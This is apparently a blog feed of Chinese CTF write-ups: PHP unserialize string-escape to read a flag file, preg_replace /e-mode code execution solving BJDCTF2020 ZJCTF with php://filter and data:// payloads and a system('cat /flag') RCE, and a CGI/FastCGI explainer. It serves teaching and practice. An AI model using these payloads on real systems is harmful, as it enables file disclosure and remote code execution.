<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">sha1</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_path&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现是不能直接给$_SESSION[‘img’]赋值 因为上面的代码在extract后执行 所以要用别的方法</p>
<p>这里要用到php反序列化的字符串逃逸 首先什么是字符串逃逸</p>
<p>1.字数增多</p>
<p>经正则替换后的字符串长度比原来未过滤的字符串长度长 </p>
<p>比如preg_match(“p”,”ww”,$string) </p>
<p>2.字数减少</p>
<p>经正则替换后的字符串长度比原来未过滤的字符串长度短 比如这道题  放个学习连接</p>
<p> <a href="https://xz.aliyun.com/t/9213">PHP反序列化 — 字符逃逸 - 先知社区 (aliyun.com)</a></p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_POST</span>);</span><br><span class="line"><span class="variable">$serialize_info</span> = <span class="title function_ invoke__">filter</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>));</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$function</span> == <span class="string">&#x27;show_image&#x27;</span>)&#123;</span><br><span class="line">    <span class="variable">$userinfo</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serialize_info</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;img&#x27;</span>]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析这几句代码 首先对我们post传入的东西进行变量覆盖 比如我现在如果传入了一个 _SESSION[flag]=1</p>
<p>那么现在超全局变量_SESSION 中所存在的两个值为 我们传入的_SESSION[flag] 和上面提到的_SESSION[img]</p>
<p>接着分析 又对SESSION超全局变量进行序列化 再进行过滤 这里就会造成一个问题</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;flagphp&#x27;</span>] = <span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;img&#x27;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;guest_img.png&#x27;</span>);</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$a</span>);</span><br><span class="line">var_dump</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>输出结果 </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;flagphp&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>再对上面的结果进行过滤</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现由于flagphp是正则表达式中需要过滤的字符 导致被替换为空 这里是第一个利用点</p>
<p>再看代码最后一行 可以通过控制_SESSION[img]的值从而控制读取的文件内容 这是第二个利用点</p>
<p>第一个点好像没有什么思路 先看第二个点 想要修改读取文件的内容 就 但是刚才提到过 不能直接给$_SESSION[‘img’]赋值 因为对该变量的赋值是在extract后执行的</p>
<p>所以想要改写就要在赋值之后进行 赋值后面可以利用的位置只有序列化 所以要在这里进行绕过</p>
<p>想直接把base64的值替换为目标flag地址的base64 但是这样是不可行的 可以看到上面由于过滤掉了关键字导致序列化的格式出现了问题 说好的7个字符已经不存在了 再进行反序列化就会报错 所以要重新构造payload既能修改键值又能成功反序列化</p>
<p>刚才的链接里提到了绕过方式 我就不多说了 用这道题举个例子   下面的phpflag会被过滤成空 看的时候自动转换成空白即可</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>因为img是需要我们拿来使用的键 所以先从它入手 由于不能直接替换 所以要进行插入</p>
<p>将我们想要构造的img键插入到原来的img键的位置  新插入的base64是d0g3_f1ag.php</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>在进行反序列化时 第一个}后面的东西就都被当成无效字符扔掉了 这样初步构造就完成了 接下来要做的就是修改格式 使它能成功反序列化</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>构造一下   </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>构造后的第一个键 键名为 “;s:11: 长度为7 键值为字符”1” 长度为1 与另外一部分进行拼接</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">2</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>这里我传入的SESSION变量是_SESSION[flagphp] 如果下标不同 序列化后要求的字数也不同 所以不同的下标构造出的payload也是不同的</p>
<p>这里一定有人问 如果phpflag被替换为空 格式不对啊 s7后面并不是七个字符 </p>
<p>但是别忘了我们的payload是要经过序列化的 也就是将</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">_<span class="variable">$SESSION</span>[phpflag]=;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>进行序列化 序列化后的结果是</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">7</span>:<span class="string">&quot;phpflag&quot;</span>;s:<span class="number">87</span>:<span class="string">&quot;;s:1:&quot;</span><span class="number">1</span><span class="string">&quot;;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>ZDBnM19mMWFnLnBocA==<span class="string">&quot;;&#125;s:3:&quot;</span>img<span class="string">&quot;;s:20:&quot;</span>Z3Vlc3RfaW1nLnBuZw==<span class="string">&quot;;&#125;&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>那么现在将phpflag替换成空之后格式是不是就对了呢 第一个键名为 “;s:87: 键值为 字符1</p>
<p>最后取出我们要传入的部分 </p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">;s:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;ZDBnM19mMWFnLnBocA==&quot;</span>;&#125;s:<span class="number">3</span>:<span class="string">&quot;img&quot;</span>;s:<span class="number">20</span>:<span class="string">&quot;Z3Vlc3RfaW1nLnBuZw==&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>

<p>传入payload</p>
<p>再次修改payload 将d0g3_f1ag.php的base64替换成/d0g3_fllllllag的base64 由于替换后长度依旧是20 所以不用修改其他部分</p>
]]></content>
      <categories>
        <category>网安</category>
        <category>web</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>preg_match e模式下的代码执行漏洞</title>
    <url>/2022/06/09/preg-match-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="preg-match-e-模式下的代码执行漏洞"><a href="#preg-match-e-模式下的代码执行漏洞" class="headerlink" title="preg_match e 模式下的代码执行漏洞"></a>preg_match e 模式下的代码执行漏洞</h1><h2 id="漏洞可利用php版本"><a href="#漏洞可利用php版本" class="headerlink" title="漏洞可利用php版本"></a>漏洞可利用php版本</h2><ul>
<li><p>php 3.x版本可无报错利用</p>
</li>
<li><p>php 5.x版本虽然会报错 但是仍然可以利用 </p>
</li>
<li><p>php 7.x版本后不再可用</p>
</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>对于php正则使用最多的函数就是preg_match()  该函数有许多可用模式 比如最常见的i模式 即不区分大小写 本次漏洞所用的为e模式 那么什么是e模式</p>
<ul>
<li>preg_match 的e模式</li>
</ul>
<p>preg_match(par1,par2,par3) 参数1为正则匹配部分 参数2为正则替换部分 参数3为被检索字符串 开启e模式后可以使用==反向引用==功能 ==并且par2会被当成php代码执行==</p>
<p>==什么是反向引用==</p>
<p>对一个正则表达式模式或部分模式 两边添加圆括号会导致 如果被匹配字符串中的某一部分被成功匹配（这里记该部分字符串为b）则会将b存储到一个临时缓冲区中 所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储 缓冲区编号从 1 开始 最多可存储 99 个捕获的子表达式 每个缓冲区都可以使用 ‘\n’ 访问 其中 n 为一个标识特定缓冲区的一位或两位十进制数 并且后续还需要用到b 那么就可以使用反向引用调用b</p>
<p>放一段代码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到上面的正则中 $re 和 $str 可以通过遍历$_GET从而被客户端控制 并且该正则开启了e模式</p>
<p>当我们以get方式传入以下payload时</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;</span><br></pre></td></tr></table></figure>

<p>超全局变量$_GET 以数组形式储存 键名为get传参的参数 键值为传参的值 所以数组中第一个键为</p>
<p><code>\S*==&gt;$&#123;getFlag()&#125;</code></p>
<p>经过foreach变量后 re的值为\S*  str的值为${getFlag()}</p>
<p>所以正则被替换为</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . \S* . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        $&#123;<span class="title function_ invoke__">getFlag</span>()&#125;</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>

<p>此时的正则匹配部分为<code>\S* </code> 也就是所有非空白字符 被匹配字符串为<code>$&#123;getFlag()&#125;</code> 这样匹配<code>$&#123;getFlag()&#125;</code>是一定会被匹配到的 并且因为前面的<code>\S*</code>加了括号 所以导致了反向引用 导致<code>$&#123;getFlag()&#125;</code>被存入缓冲区 并且可以被调用 再看第二个参数<code>strtolower(&quot;\\1&quot;)</code> 第一个反斜线是转义用的 所以其实就是<code>strtolower(&quot;\1&quot;)</code> 上面提到被反向引用的字符串存入缓冲区后可以使用<code>\n</code>的方式调用 所以这里就调用了刚才存入缓冲区的<code>$&#123;getFlag()&#125;</code> 并且被当成php代码解析 其中的getFlag()函数被解析从而达到目的 由于php只对变量名区分大小写 所以即使strtolower后函数也可以被成功调用s</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h2 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h2><figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;I have a dream&quot;</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Not now!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里考伪协议</p>
<p>注意 一个点 text 在file_get_scontents中作为一个文件打开 对文件写入要使用伪协议 这里可用data伪协议或者php伪协议对text写入 然后用php伪协议看一下next.php 源码（直接包含啥信息都没有）</p>
<p>payload1</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?text=data:<span class="comment">//text/plain,I have a dream&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br></pre></td></tr></table></figure>

<p>payload2</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">?text=php:<span class="comment">//input&amp;file=php://filter/read=convert.base64-encode/resource=next.php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST    I have a dream</span><br></pre></td></tr></table></figure>

<p>base64解码后拿到next.php源码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">	@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>解题步骤和漏洞原理相同 最终构造出的payload为</p>
<figure class="highlight plaintext"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">/next.php?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>


]]></content>
      <categories>
        <category>Web</category>
        <category>网安</category>
      </categories>
      <tags>
        <tag>标签2</tag>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title>动态网页基础原理-CGI</title>
    <url>/2022/04/26/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E5%9F%BA%E7%A1%80%E5%8E%9F%E7%90%86-CGI/</url>
    <content><![CDATA[<h1 id="动态网页基础原理-CGI"><a href="#动态网页基础原理-CGI" class="headerlink" title="动态网页基础原理-CGI"></a>动态网页基础原理-CGI</h1><p>以下内容来源于 <a href="https://mp.weixin.qq.com/s/BHYQNDcXXXr7U04lWwQdrg">全面了解CGI、FastCGI、PHP-FPM (qq.com)</a> 想看原文请移步 下面是我自己的总结和扩充</p>
<h2 id="Web-Server传递数据的方法"><a href="#Web-Server传递数据的方法" class="headerlink" title="Web Server传递数据的方法"></a>Web Server传递数据的方法</h2><p>应该有不少人和我一样 在进行php开发时用的phpstudy来进行集成化的搭建环境 但是如果不用phpstudy那么在windows配置php开发环境时 应该经历这么几个步骤 </p>
<p>1.安装php 和 apach</p>
<p>2.在apache的配置文件（httpd.conf）添加并修改如下配置文件 这一步是为了让服务器能够解析php代码</p>
<figure class="highlight php"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line"><span class="comment">#添加下边两行</span></span><br><span class="line">LoadModule php5_module D:/php/php5apache2_2.dll</span><br><span class="line">AddType application/x-httpd-php .php</span><br><span class="line"><span class="comment"># 修改如下内容</span></span><br><span class="line">&lt;IfModule dir_module&gt;</span><br><span class="line">    DirectoryIndex index.php index.html</span><br><span class="line">&lt;/IfModule&gt;</span><br></pre></td></tr></table></figure>

<p>linux环境下</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">./configure --with-mysql=/usr/local --with-apache=/usr/local/apache --enable-track-vars</span><br></pre></td></tr></table></figure>

<p>原理都是用LoadModule加载php5_module 也就是把php作为apache的一个子模块来运行 当通过web访问php文件时 apache就会调用php5_module 来解析php代码</p>
<p>但是php5_module又是如何将数据传给php的解析器来解析php代码的呢 这里就用到了sapi</p>
<p>来看一下apache php和sapi之间的关系</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426135529236.png" alt="image-20220426135529236"></p>
<p>可以看出sapi是一个中间过程 sapi提供了一个和外部通信的接口，使得PHP可以和其他应用进行交互数据（apache，nginx等）。php默认提供了很多种sapi，常见的提供给apache和nginx的php5_module、CGI、FastCGI，给IIS的ISAPI，以及Shell的CLI。（httpd是Apache超文本传输协议(HTTP)服务器的主程序。被设计为一个独立运行的后台进程，它会建立一个处理请求的子进程或线程池）</p>
<p>所以，以上的apache调用php执行的过程如下：</p>
<figure class="highlight shell"><button class="btn-copy" data-clipboard-snippet="" title="复制"><img src="//cdn.jsdelivr.net/gh/5MayRain/ImageHosting/Blog/Website/icon/copy.svg" /></button><table><tr><td class="code"><pre><span class="line">apache -&gt; httpd -&gt; php5_module -&gt; sapi -&gt; php</span><br></pre></td></tr></table></figure>

<p>这种模式将ogo安装到apache中 每一次apache请求都会产生一条进程 这个进程就完整的包括php的各种运算记算等操作</p>
<p>在上图中 apache每接收一个请求 都会生成一个进程来连接php 但是如果在同一时间点上收到了大量的请求（用户过多产生的问题 听起来有点像dos）服务器就会承受不住而崩溃 而且把php当作一个module加载到apache中 出问题时很难确定时php的问题还是服务器的问题</p>
<h2 id="CGI"><a href="#CGI" class="headerlink" title="CGI"></a>CGI</h2><p>在整个网站架构中，Web服务器只是内容的分发者 举个例子 如果客户端请求的是index,html 那么Web Server会去文件系统中找到这个文件 发送给浏览器 这里分发的是静态数据</p>
<p><img src="C:/Users/86132/AppData/Roaming/Typora/typora-user-images/image-20220426141324714.png" alt="image-20220426141324714"></p>
<p>如果请求的是index.php 根据配置文件 服务器知道这个不是静态文件 需要找php解析器来处理 那么他会把这个请求简单处理 交给php解析器</p>
<p><img src="https://s2.loli.net/2022/04/26/NvO7WsjLlT5C1KY.png" alt="image-20220426141449993"></p>
<p>当服务器收到index,php在收到index,php这个请求之后 会启动对应的CGI程序 这里就是php的解析器 接下来php解析器会解析php.ini文件 初始化执行环境 然后处理请求 再以规定CGI规定的格式返回处理后的结果 退出进程 服务器再把结果返回给浏览器 这就是一个完整的动态PHP Web访问流程 所以引出这几个词</p>
<p><strong>CGI</strong>：是 Web Server 与 Web Application 之间数据交换的一种协议。</p>
<p><strong>FastCGI</strong>：同 CGI，是一种通信协议，但比 CGI 在效率上做了一些优化。</p>
<p><strong>PHP-CGI</strong>：是 PHP （Web Application）对 Web Server 提供的 CGI 协议的接口程序。</p>
<p><strong>PHP-FPM</strong>：是 PHP（Web Application）对 Web Server 提供的 FastCGI 协议的接口程序，额外还提供了相对智能一些任务管理。</p>
<p>（Web Server 一般指Apache、Nginx、IIS、Tomcat等服务器，Web Application 一般指PHP、Java、Asp.net等应用程序） </p>
<h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p><strong>1、****CGI</strong></p>
<p>CGI（Common Gateway Interface）全称是“通用网关接口”，WEB 服务器与PHP应用进行“交谈”的一种工具，其程序须运行在网络服务器上。CGI可以用任何一种语言编写，只要这种语言具有标准输入、输出和环境变量。如php、perl、tcl等。</p>
<p>WEB服务器会传哪些数据给PHP解析器呢？URL、查询字符串、POST数据、HTTP header都会有。所以，CGI就是规定要传哪些数据，以什么样的格式传递给后方处理这个请求的协议。也就是说，CGI就是专门用来和 web 服务器打交道的。web服务器收到用户请求，就会把请求提交给cgi程序（如php-cgi），cgi程序根据请求提交的参数作应处理（解析php），然后输出标准的html语句，返回给web服服务器，WEB服务器再返回给客户端，这就是普通cgi的工作原理。（cgi程序，你就可以理解成遵循cgi协议编写的程序）</p>
<p><strong>优点：</strong></p>
<p>CGI的好处就是完全独立于任何服务器，仅仅是做为中间分子。提供接口给web服务器和web应用(如提nginx和php)。他们通过cgi搭线来完成数据传递。这样做的好处了尽量减少他们两个的关联，使他们变得更独立。</p>
<p><strong>缺点：</strong></p>
<p>但是CGI有个难受的地方，就是<strong>每一次</strong>web请求都会有启动和退出过程，也就是最为人诟病的fork-and-execute模式，这样一在大规模并发下，就死翘翘了。 </p>
<p><strong>2、FastCGI</strong></p>
<p>从根本上来说，FastCGI是用来提高CGI程序性能的。类似于CGI，FastCGI也可以说是一种协议。</p>
<p>FastCGI像是一个常驻(long-live)型的CGI，它可以一直执行着，只要激活后，不会每次都要花费时间去fork一次。</p>
